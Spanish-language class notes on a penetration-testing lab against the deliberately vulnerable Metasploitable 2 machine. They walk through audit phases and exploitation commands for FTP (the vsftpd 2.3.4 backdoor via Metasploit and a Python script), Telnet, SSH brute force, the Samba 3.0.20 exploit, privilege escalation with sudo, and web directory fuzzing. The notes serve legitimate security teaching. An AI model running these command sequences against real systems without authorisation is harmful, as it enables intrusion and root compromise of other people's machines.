**El flujo completo de una auditoría: las cinco fases**

Antes de entrar en los exploits, Daniel introduce el marco metodológico que da estructura a todo lo que se va a ver. Las cinco fases de una auditoría son reconocimiento, enumeración, análisis de vulnerabilidades, explotación y post-explotación.

- **Reconocimiento:** descubrir qué hay en la red. Net-Discover, ARP-Scan, ping con análisis de TTL
    
- **Enumeración:** identificar qué servicios y versiones tiene cada host. Nmap con -sCV sobre los puertos encontrados, SMB-Client, FTP anónimo
    
- **Análisis de vulnerabilidades:** buscar si las versiones encontradas tienen exploits conocidos. SearchSploit y ExploitDB son las herramientas principales
    
- **Explotación:** usar esos exploits para obtener acceso. Metasploit, scripts en Python, fuerza bruta con Hydra
    
- **Post-explotación:** una vez dentro, escalar privilegios hasta root y mantener el acceso (persistencia)
    

La diferencia entre explotación y post-explotación es importante: explotación es entrar al sistema con cualquier usuario, post-explotación es todo lo que ocurre después para aumentar el control y el acceso.

**Puerto 21 — FTP: tres vectores, tres demostraciones**

El FTP de Metasploitable 2 tiene la versión **vsftpd 2.3.4**, que Nmap con -sCV detecta automáticamente. Esta versión tiene una backdoor conocida desde 2011 que está catalogada en ExploitDB y disponible como módulo en Metasploit.

**Vector 1 — Sesión anónima**

Nmap con -sC ya indica en su output si el FTP permite login anónimo. Para comprobarlo manualmente:

```
ftp IP_OBJETIVO
```

Usuario anonymous, sin contraseña. Si entra, se puede listar con dir o ls, descargar ficheros con get y subir con put. El peligro de tener sesión anónima activa es que cualquiera puede subir ficheros al servidor. Si esa carpeta del FTP es accesible desde la web, se puede subir una reverse shell en PHP, ejecutarla desde el navegador y obtener acceso al servidor.

**Vector 2 — Exploit de la versión (Metasploit)**

```
msfconsole
search vsftpd 2.3.4
use 0
show options
set RHOSTS IP_OBJETIVO
set LHOST IP_KALI
run
```

Al lanzar el exploit aparece el mensaje backdoor has been spawned. Dentro del meterpreter se lanza shell para obtener una shell interactiva, y whoami confirma que somos root directamente.

**Vector 3 — Script en Python (sin Metasploit)**

SearchSploit muestra el mismo exploit disponible como script en Python. Para encontrar la ruta completa:

```
locate vsftpd
```

Copiar el script al directorio de trabajo para no modificar el original:

```
cp /ruta/completa/al/script.py .
python3 script.py IP_OBJETIVO
```

Si el script va demasiado rápido y no devuelve respuesta, se añade un pequeño delay: abrir el archivo con nano, añadir import time al inicio, y en la línea donde hace la conexión añadir time.sleep(2). Guardar con Ctrl+O, Enter, Ctrl+X y relanzar.

- **La idea clave:** para FTP hay exactamente tres vectores: sesión anónima, versión vulnerable y credenciales obtenidas por otro medio. Si ninguno de los tres aplica, el FTP no ofrece más superficie de ataque de forma aislada. El contexto lo cambia todo: si la carpeta del FTP está expuesta en la web, la sesión anónima puede convertirse en ejecución de código remoto

**Puerto 23 — Telnet: credenciales en texto claro**

Telnet es un protocolo de gestión remota similar a SSH pero sin cifrado, considerado obsoleto. El vector de ataque es simplemente intentar la conexión:

```
telnet IP_OBJETIVO
```

La máquina Metasploitable 2 tiene una mala configuración grave: al conectar, muestra directamente en pantalla el usuario y la contraseña con los que hay que autenticarse. En un servidor bien configurado esto no ocurriría nunca. Con msf admin / msf admin se entra, y whoami muestra que somos el usuario msfadmin, no root.

**Escalada de privilegios desde Telnet**

Una vez dentro como usuario normal, el primer comando de diagnóstico es:

```
sudo -l
```

Este comando muestra qué comandos puede ejecutar el usuario actual con permisos de root. En Metasploitable 2, muestra ALL, es decir, todos. Esto significa que el usuario msfadmin puede ejecutar cualquier cosa como root, lo que es una configuración pésima.

Con eso, la escalada es inmediata:

```
sudo su
whoami
```

Ya somos root. La página **GTFOBins** es la referencia para escalada de privilegios en Linux: si sudo -l muestra que tenemos permiso sobre un comando concreto (Python, Vim, Ncat, etc.), GTFOBins explica cómo aprovecharlo para obtener una shell como root.

- **La metáfora útil:** sudo -l es como revisar qué llaves tiene el usuario. Si tiene la llave maestra (ALL), no hay barrera. Si solo tiene la llave del almacén, GTFOBins te dice cómo usar esa llave para copiar la maestra

**Puerto 22 — SSH: fuerza bruta con Metasploit**

Para demostrar que Metasploit no solo sirve para lanzar exploits, se usa su módulo de escaneo de login SSH para hacer fuerza bruta:

```
msfconsole
search ssh/login
use 0
show options
set RHOSTS IP_OBJETIVO
set USER_FILE /ruta/usuarios.txt
set PASS_FILE /ruta/passwords.txt
set STOP_ON_SUCCESS true
run
```

El parámetro STOP_ON_SUCCESS true hace que el módulo pare en cuanto encuentre credenciales válidas, evitando seguir probando innecesariamente.

A diferencia del exploit de FTP que abría una sesión automáticamente, el escáner de login SSH no abre la shell: guarda la sesión como sesión activa en Metasploit. Para ver las sesiones guardadas:

```
sessions
```

Para entrar en una sesión concreta:

```
sessions 1
```

Para dejar una sesión en segundo plano sin cerrarla:

```
Ctrl + Z
```

Esto permite tener múltiples sesiones abiertas simultáneamente a diferentes máquinas o con diferentes usuarios, y gestionarlas todas desde Metasploit.

Una vez dentro por SSH como msfadmin, la escalada de privilegios es idéntica a la de Telnet: sudo -l muestra ALL, sudo su convierte al usuario en root.

**Puerto 139 y 445 — SMB/Samba: enumeración y exploit**

SMB (Server Message Block), implementado en Linux como Samba, es el protocolo para compartir recursos en red: carpetas, impresoras, ficheros. Es especialmente relevante en entornos de directorio activo Windows, pero también aparece en servidores Linux.

**Enumeración de recursos compartidos**

```
smbclient -L -N //IP_OBJETIVO/
```

- -L lista los recursos compartidos disponibles
    
- -N indica que no tenemos credenciales (sesión anónima)
    

El resultado muestra carpetas compartidas como tmp, opt, C$ y otras. En auditorías reales se encuentran con frecuencia carpetas compartidas que contienen nóminas, credenciales, documentación interna o drivers con rutas sensibles.

**Obtener la versión de Samba sin Nmap**

Si no se tiene acceso a Nmap, Metasploit tiene un módulo escáner que detecta la versión de SMB:

```
search smb version
use 103
set RHOSTS IP_OBJETIVO
run
```

Esto devuelve la versión exacta de Samba, con la que luego se puede buscar en SearchSploit.

**Exploit de la versión vulnerable**

La versión que tiene Metasploitable 2 (**Samba 3.0.20**) tiene una vulnerabilidad conocida. El flujo es el mismo que con FTP:

```
searchsploit Samba 3.0.20
msfconsole
search Samba 3.0.20
use 0
set RHOSTS IP_OBJETIVO
run
```

El resultado es una sesión directamente como root, sin necesidad de escalada de privilegios.

- **La idea clave:** cada servicio tiene su checklist. Para SMB: enumerar recursos compartidos con smbclient, identificar la versión, buscar la versión en SearchSploit. Si hay exploit, usarlo. Si no, revisar el contenido de las carpetas compartidas buscando credenciales o información sensible

**Gestión de procesos y servidor HTTP con Python**

Cuando Metasploit deja un puerto ocupado y no libera la sesión correctamente, hay que identificar y matar el proceso:

```
ss -antp | grep PUERTO
```

o bien:

```
ps aux | grep PUERTO
```

Para matar el proceso identificado:

```
kill -9 PID
```

Python permite levantar un servidor HTTP de forma inmediata en el directorio actual:

```
python3 -m http.server 80
```

Cualquier fichero del directorio queda accesible vía navegador desde cualquier máquina en la misma red apuntando a [http://IP_KALI:80](http://ip_kali/). Esto tiene un uso práctico muy concreto: cuando se compromete una máquina que no tiene acceso a Internet pero sí visibilidad con Kali, se puede transferir herramientas o exploits desde Kali usando este servidor.

---

**Puerto 80 — HTTP: primera toma de contacto y fuzzing de directorios**

El puerto 80 expone una aplicación web. La primera aproximación es navegar a [http://IP_OBJETIVO](http://ip_objetivo/) para ver qué hay. Lo que se ve en la raíz no es todo lo que existe: muchos directorios y ficheros están presentes pero no enlazados desde la página principal.

Para descubrirlos se usa **fuzzing de directorios** con ffuf:

```
ffuf -u http://IP_OBJETIVO/FUZZ -w /usr/share/dirb/wordlists/common.txt -c
```

- FUZZ es el marcador que ffuf sustituye por cada palabra del diccionario
    
- -w indica el diccionario a usar
    
- -c activa los colores en el output
    

Los diccionarios recomendados están en /usr/share/dirb/wordlists/ (incluidos con Kali) o en **SecLists**, una colección mucho más completa que incluye listas especializadas para fuzzing web, usuarios, contraseñas, SQL Injection, LFI y más.

El fuzzing encuentra, entre otros, el fichero phpinfo.php. Este fichero, que PHP genera automáticamente para diagnóstico y que debería eliminarse antes de poner el servidor en producción, expone información crítica: versión exacta de PHP, versión del sistema operativo, configuración del servidor Apache, rutas internas del sistema y si CGI está habilitado.

El CGI habilitado es especialmente interesante: permite enviar peticiones GET que el servidor interpreta como comandos, lo que abre la puerta a ejecutar código remotamente y obtener una reverse shell como el usuario del servidor web (www-data). Esto se verá en la próxima sesión.

**Recapitulación integrada**

Al cerrar esta sesión hemos recorrido la cadena completa de explotación en cuatro servicios distintos. Sabemos que FTP tiene tres vectores (anónimo, versión y credenciales) y que el peligro real aparece cuando FTP y HTTP se combinan. Que Telnet expone credenciales en texto claro y que sudo -l es siempre el primer diagnóstico para la escalada. Que SSH se puede atacar por fuerza bruta desde Metasploit y que las sesiones quedan persistentes mientras no se cierre el framework. Y que SMB permite enumerar recursos compartidos con smbclient antes de lanzar ningún exploit. El siguiente paso es el puerto 80: el phpinfo.php que hemos encontrado vía fuzzing tiene CGI habilitado, lo que nos va a permitir nuestra primera explotación web con ejecución remota de código.
